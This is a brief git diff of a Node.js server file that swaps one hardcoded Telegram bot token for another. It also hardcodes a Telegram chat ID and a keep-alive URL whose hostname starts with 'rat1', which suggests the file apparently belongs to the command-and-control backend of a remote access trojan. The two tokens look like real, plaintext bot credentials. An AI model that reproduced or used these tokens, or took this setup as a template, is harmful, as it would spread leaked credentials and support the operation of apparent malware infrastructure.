@@ -8,7 +8,7 @@ const bodyParser = require('body-parser');
 const axios = require("axios");
 
 const PORT = process.env.PORT || 8999;
-const token = '7144522875:AAEFGYd8mx8p3wvfpBozxW5Ea5L-XEG2y2M';
+const token = '7833060237:AAGYt8nKFRLHXi2DoTTePcEJVcDabcR-P3s';
 const telegramId = '1784606556';
 const pingAddress = 'https://rat1-74a9.onrender.com/';
 
